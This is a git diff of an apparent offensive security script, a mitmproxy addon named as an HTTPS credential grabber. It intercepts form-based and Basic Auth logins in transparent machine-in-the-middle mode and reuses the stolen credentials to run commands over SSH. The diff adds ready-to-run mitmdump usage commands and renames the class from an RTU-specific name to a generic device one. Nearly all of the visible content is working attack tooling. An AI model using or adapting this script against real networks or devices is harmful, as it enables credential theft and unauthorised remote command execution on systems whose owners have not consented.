@@ -8,11 +8,15 @@ import paramiko
 #     These credentials can be used to authenticate to the web application or service.
 #     These credentials can also be used to authenticate with other network services
 #     such as Telnet and SSH
-# # Requirements
+# Requirements:
 #     mitmproxy - machine-in-the-middle proxy that takes python scripts to process data
 #     paramiko  - python based ssh client that comes installed on Kali
+# Usage:
+#     Form based logins with pages that have 'AUTH' in the URL
+#         sudo mitmdump -q -k -s ./mitmdump_https_cred_grabber.py --listen-host 172.16.32.110 -p 443 -m transparent "~u AUTH ~m POST"
+#     Applications that use Basic Authentication with Base64 encoded credentials
+#         sudo mitmdump -q -k -s ./mitmdump_https_cred_grabber.py --listen-host 172.16.32.110 -p 443 -m transparent "~m GET ~hq Auth"
 ####################
-
 
 ####################
 # Original Example: https://stackoverflow.com/questions/27369144/use-mitmproxy-to-translate-a-form-key-value-to-a-body-post
@@ -22,9 +26,9 @@ DEBUG = False
 SSH_CONNECT = False
 #SSH_CONNECT = True
 
-class GetRTUCreds:
+class GetDeviceCreds:
     
-    #Process HTTPS Request
+    #Process HTTPS Requests
     def request(self,flow: http.HTTPFlow):
         u = ''
         p = ''
@@ -76,15 +80,13 @@ class GetRTUCreds:
         for c in cmds:
             try: 
                 stdin, stdout, stderr = client.exec_command(c)
-                if stdout: 
-                    out = stdout.read().decode().strip()
-                    print("Result: %s"%(out))
+                out = stdout.read().decode().strip()
+                if out: print("Result: %s"%(out))
                 #if stdin: sin = stdin.read().decode().strip()
-                if stderr: 
-                    err = stderr.read().decode().strip()
-                    print("Result: %s"%(err))
+                err = stderr.read().decode().strip()
+                if err: print("Err: %s"%(err))
             except:
                 print('Cmd Failed: %s'%(c))
         client.close() 
 
-addons = [GetRTUCreds()]
+addons = [GetDeviceCreds()]
